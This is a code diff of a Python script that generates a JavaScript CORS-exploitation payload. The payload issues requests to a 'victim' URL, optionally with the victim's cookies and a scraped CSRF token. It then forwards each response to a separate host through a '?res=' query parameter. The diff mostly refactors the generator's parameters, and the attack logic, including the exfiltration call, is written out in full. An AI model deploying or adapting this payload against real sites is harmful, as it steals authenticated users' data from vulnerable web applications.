@@ -1,8 +1,8 @@
 import re,requests
 
 class writejs():
-    def __init__(self, args,arg):
-            self.arg = arg
+    def __init__(self, args, arg):
+            self.cf = arg
             self.args = args
             self.callcsrf = ''
             if self.args.auth.lower() != 'y':
@@ -10,7 +10,6 @@ class writejs():
             else:
                 self.cookie = '.withCredentials = false;'
             if self.args.csrf.lower() == 'y':
-                self.domain = input("Please Enter Main URL: ")
                 def csrf(dom):
                     req = requests.get(dom)
                     try:
@@ -21,8 +20,8 @@ class writejs():
                     token2 = re.search('\s(\w+)',token)[1]
                     token1 = re.search('name="(.*)"\s',token,re.DOTALL)[1].strip()
                     return token1,token2
-                self.content1,self.content2 = csrf(self.domain)  
-                self.callcsrf= f"token('{self.domain}' , '{self.content1}', '{self.content2}')"
+                self.content1,self.content2 = csrf(self.cf.domain)  
+                self.callcsrf= f"token('{self.cf.domain}' , '{self.content1}', '{self.content2}')"
             with open ('CORS_Javascript/cors.js','w') as f:
                 f.write('''
         function token(site,reg1 ,reg2){
@@ -43,7 +42,7 @@ class writejs():
                 xhr_back.open('GET', site+'/?res='+response , true);
                 xhr_back.send();
             } 
-            function sendreq(method, site, victim, args,head){
+            function sendreq(method, site, victim, args, head){
                 var xhr = new XMLHttpRequest();
                 xhr.onreadystatechange = function() {
                 if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
@@ -52,16 +51,15 @@ class writejs():
                 }
                 xhr.open(method, victim, true);
                 xhr.setRequestHeader('Content-Type', head)
-            '''f''' xhr{self.cookie}''''''
+            '''f''' xhr{self.cookie}
+            {self.cf.wcsrf}''''''
                 xhr.send(args);
             }'''f'''
-            if ('{self.args.method.upper()}' !== 'GET')'''"{"f'''
+            if ('{self.cf.method.upper()}' !== 'GET')'''"{"f'''
                 {self.callcsrf}
-                head = '{self.args.content}'
-                sendreq('{self.args.method.upper()}', '{self.args.site}','{self.args.victim}',`{self.arg}` ,head)
+                sendreq('{self.cf.method.upper()}', '{self.args.site}','{self.cf.url}',`{self.cf.body}` ,'{self.cf.content}')
             ''''''}
             else{'''f'''
-                head = 'text/plain'
-                sendreq('{self.args.method.upper()}', '{self.args.site}','{self.args.victim}','',head)
+                sendreq('{self.cf.method.upper()}', '{self.args.site}','{self.cf.url}','','{self.cf.content}')
             ''''}')
             
